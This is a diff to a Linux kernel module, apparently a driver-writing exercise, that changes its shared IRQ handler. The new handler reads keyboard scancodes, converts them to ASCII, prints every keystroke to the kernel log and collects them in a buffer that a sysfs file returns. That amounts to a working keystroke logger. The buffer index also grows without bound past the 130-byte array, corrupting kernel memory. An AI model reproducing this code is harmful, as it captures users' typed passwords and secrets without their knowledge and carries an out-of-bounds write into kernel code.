@@ -23,6 +23,7 @@
 /* global and static variables */ 
 
 dev_t dev ;
+static int irq_dev_id ; 
 static struct cdev mycdev ;
 static struct class *myclass ;
 static struct device *mydevice ; 
@@ -30,6 +31,19 @@ static struct task_struct *kthread;
 static struct kobject *kobject_ref;
 static char device_buffer[BUFF_SIZE] ;
 static int kobj_value =  10 ; 
+static char ch ;
+static char keystroke_buffer[130] ; 
+/* scancode to ascii  */
+static const char  scancode_to_ascii[128] = 
+{
+
+       0, 27 , '1' , '2' , '3' , '4' , '5' , '6' , '7' ,'8' , '9' , '0' , '-', '=', '\b',
+	'\t' , 'q' , 'w','e', 'r' ,'t' , 'y' , 'u' , 'i' , 'o', 'p' , '[' , ']' , '\n' , 
+      'a' , 's' , 'd', 'f', 'g', 'h', 'j', 'k','l',';', '\''  , '`' , '\\'	, 
+      'z', 'x','c' ,'v', 'b', 'n' , 'm' ,',' ,'.' ,'/', '*' , ' ' , 0 
+
+};
+
 
 
 /******************************** DRIVER FUNCTION PROTOTYPE *********************** */ 
@@ -49,9 +63,22 @@ static ssize_t sysfs_store(struct kobject *kobj , struct kobj_attribute *attr ,c
 
 static irqreturn_t irq_handler ( int  irq   , void *dev_id) 
 {
-	unsigned char scancode = inb(0x60); 
-	pr_info("scancode : 0x%02x\n",scancode);
-	pr_info(" IRQ_NO :%d \n",irq) ;
+	static int count = 0 ; 
+	unsigned char scancode = inb(0x60);
+       if(scancode  < 128 ) 
+       {
+	  ch  =    scancode_to_ascii[scancode] ; 
+	 if(ch != 0) 
+	 {
+		keystroke_buffer[count] = ch ;
+	       keystroke_buffer[count +1] = '\0' ; 
+
+		count ++ ; 
+		pr_info("Key Entered : %c With scancode :  0x%02x\n",ch, scancode) ; 
+	 } 
+
+       }
+
 	pr_info("  SHARED IRQ  : Interrupt Occured \n"); 
 	return  IRQ_HANDLED ;
 } 
@@ -60,7 +87,7 @@ static irqreturn_t irq_handler ( int  irq   , void *dev_id)
 
 /* file attribute for sysfs */ 
 
-struct kobj_attribute kobj_attr = __ATTR("interrupt_file", 0660, sysfs_show , sysfs_store) ;
+struct kobj_attribute kobj_attr = __ATTR(interrupt_file, 0660, sysfs_show , sysfs_store) ;
 
 
 /* file operations for driver    */
@@ -83,7 +110,7 @@ static int thread_function ( void *data )
 	while (!kthread_should_stop())
 	{
 
-		pr_info(" --WAITING FOR EVENT -- \n");
+		pr_info(" --WAITING FOR EVENT -- \n" );
 		size_t temperature ; 
 
 		temperature = get_random_u32() % 100;
@@ -100,7 +127,7 @@ static int thread_function ( void *data )
 
 static ssize_t sysfs_show(struct kobject *kobj , struct kobj_attribute *attr , char *buff)
 {
-	return sprintf(buff , "%d",kobj_value) ; 
+	return sprintf(buff  , "%s",keystroke_buffer) ; 
 }
 
 static ssize_t sysfs_store(struct kobject *kobj , struct kobj_attribute *attr ,const  char *buff, size_t count)
@@ -169,7 +196,7 @@ static int __init hello_init(void)
 	} 
 
 
-	if(request_irq(IRQ_NO , irq_handler , IRQF_SHARED , "interrupt_test" , (void * )(irq_handler))) 
+	if(request_irq(IRQ_NO , irq_handler , IRQF_SHARED , "interrupt_test" , &irq_dev_id)) 
 	{
 		pr_info(" FAILED TO REG IRQ \n"); 
 		goto r_irq ; 
@@ -206,7 +233,7 @@ r_device :
 static void __exit hello_exit(void)
 {
 
-	free_irq(IRQ_NO  , (void *)(irq_handler)); 
+	free_irq(IRQ_NO  , &irq_dev_id); 
 	kthread_stop(kthread);
 	kobject_put(kobject_ref);
 	sysfs_remove_file(kobject_ref , &kobj_attr.attr); 
@@ -298,7 +325,6 @@ static int my_release(struct inode *inode , struct file *file)
 	printk(KERN_INFO "  DEVICE FILE  CLOSED  \n ");
 	return 0 ; 
 } 
-
 
 
 
